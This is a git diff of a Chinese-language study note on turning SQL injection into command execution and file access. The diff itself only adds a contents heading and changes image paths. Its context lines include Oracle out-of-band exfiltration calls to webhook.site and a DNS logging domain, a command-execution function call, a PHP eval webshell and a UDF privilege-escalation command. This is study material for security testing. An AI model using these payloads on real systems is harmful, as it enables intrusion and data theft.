@@ -5,6 +5,9 @@ description: 从SQL注入到RCE、文件读写等的手段
 tags:
   - sql2other
 ---
+
+## Table of contents
+
 ## sink
 execute, executemany
 executescript(sqlite)
@@ -551,13 +554,13 @@ select * from all_tab_columns 查询出所有的字段
 select * from user_tab_columns  查询出当前用户的字段
 select * from v$version 查版本
 ```
-![](imgg/file-20260116151637685.png)
+![](assets/sql2other/file-20260116151637685.png)
 
 3.rownum=1   (限制查询返回的总行数为一条)
 对于rownum来说它是oracle系统顺序分配为从查询返回的行的编号，返回的第一行分配的是1，第二行是2，依此类推，这个伪字段可以用于限制查询返回的总行数。 
 我们可以用`where rownum<3`来要求他输出2条数据
 
-![](imgg/file-20260116151833037.png)
+![](assets/sql2other/file-20260116151833037.png)
 
 ### 信息搜集
 
@@ -687,7 +690,7 @@ DBMS_NETWORK_ACL_ADMIN权限
 SELECT UTL_HTTP.REQUEST('https://webhook.site/5a1724ff-ee18-4092-8711-078892378f7c?a=1') FROM dual
 ```
 直接用UTL_HTTP会报错
-![](imgg/file-20260116152504150.png)
+![](assets/sql2other/file-20260116152504150.png)
 
 要先创建ACL规则然后请求
 ```sql
@@ -738,7 +741,7 @@ DNS每次请求也需要加上上述ACL配置
 SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT 11 FROM dual)||'.56v13fpu.eyes.sh') FROM dual
 ```
 
-![](imgg/file-20260116154651037.png)
+![](assets/sql2other/file-20260116154651037.png)
 
 带数据
 
@@ -946,7 +949,7 @@ SELECT sys_run_cmd('/usr/bin/id') FROM dual;
 	+ 因为`CREATE DIRECTORY` 是一个 **DDL (数据定义语言)** 操作，而且是系统级的对象操作。 必须拥有 **`CREATE ANY DIRECTORY`** 系统权限。
 + 不能堆叠注入，一次只能执行一条
 
-![](imgg/file-20260118120231494.png)
+![](assets/sql2other/file-20260118120231494.png)
 
 有关Oracle注入
 [Oracle SQL注入学习 - Y4er的博客](https://y4er.com/posts/oracle-sql-inject)
@@ -969,16 +972,16 @@ mysql配置文件`secure_file_priv`项设置为空，（如果为NULL或/tmp/等
 ```
 show variables like 'secure_file_priv';
 ```
-![](imgg/Pasted%20image%2020250509120309.png)
+![](assets/sql2other/Pasted%20image%2020250509120309.png)
 
 `secure_file_priv`的更改必须要在mysql配置文件`/etc/mysql/my.cnf`里改, 并且重启才生效, 所以其实是个很苛刻的条件
-![](imgg/Pasted%20image%2020250510012820.png)
+![](assets/sql2other/Pasted%20image%2020250510012820.png)
 
 win在`"D:\Tools\phpstudy_pro\Extensions\MySQL5.7.26\my.ini"`  (如果没有这一项同样需要自己加上)
-![](imgg/Pasted%20image%2020250510021002.png)
+![](assets/sql2other/Pasted%20image%2020250510021002.png)
 
 换句话说看得这里如果为空, 说明读写目录没有限制, 才有可能下一步
-![](imgg/Pasted%20image%2020250510013120.png)
+![](assets/sql2other/Pasted%20image%2020250510013120.png)
 另外就算为空, Linux也可能对我们将要写入的`/usr/lib/mysql/plugin`插件目录进行保护
 - `/usr/lib/mysql/plugin/` 目录通常用于存放 MySQL 插件（如 UDF），默认权限较为严格。
 - MySQL 服务是以特定用户（通常是 `mysql:mysql`）运行的，因此该用户可能没权限
@@ -1075,8 +1078,8 @@ select '<?php @eval($_POST[abc]);?>' or sleep(11);
 ```sh
 python extra/cloak/cloak.py -d -i data/udf/mysql/windows/64/lib_mysqludf_sys.dll_
 ```
-![](imgg/Pasted%20image%2020250306161328.png)
-使用上面的命令，会在`lib_mysqludf_sys.dll_/lib_mysqludf_sys.so_`文件所在目录生成一个`lib_mysqludf_sys.dll/lib_mysqludf_sys.so`的文件，这个才是能被直接使用的udf提权dll文件。![](imgg/Pasted%20image%2020250704091807.png)
+![](assets/sql2other/Pasted%20image%2020250306161328.png)
+使用上面的命令，会在`lib_mysqludf_sys.dll_/lib_mysqludf_sys.so_`文件所在目录生成一个`lib_mysqludf_sys.dll/lib_mysqludf_sys.so`的文件，这个才是能被直接使用的udf提权dll文件。![](assets/sql2other/Pasted%20image%2020250704091807.png)
 3. 把so文件导入进目标的`/tmp`目录
 
 ```
@@ -1108,13 +1111,13 @@ DROP FUNCTION IF EXISTS do_system;
 不需要判断mysql的版本，直接查看路径，直接写so文件，Linux里面的文件是so文件。
 
 但是由于前面说的对`/usr/lib/mysql/plugin/`目录的保护, 写入文件的时候大概率碰上
-![](imgg/Pasted%20image%2020250510013451.png)
+![](assets/sql2other/Pasted%20image%2020250510013451.png)
 
 另外还有可能win系统下还没有创建这个目录
-![](imgg/Pasted%20image%2020250510021357.png)
+![](assets/sql2other/Pasted%20image%2020250510021357.png)
 
 复现结果: (都是sql的root权限)
-+ win mysql5.7: 在手动创建了![](imgg/Pasted%20image%2020250510021524.png)/lib/plugin目录后成功执行UDF
++ win mysql5.7: 在手动创建了![](assets/sql2other/Pasted%20image%2020250510021524.png)/lib/plugin目录后成功执行UDF
 + Linux mysql8.0, 没成功, lib/plugin插件有保护
 
 ### DoS
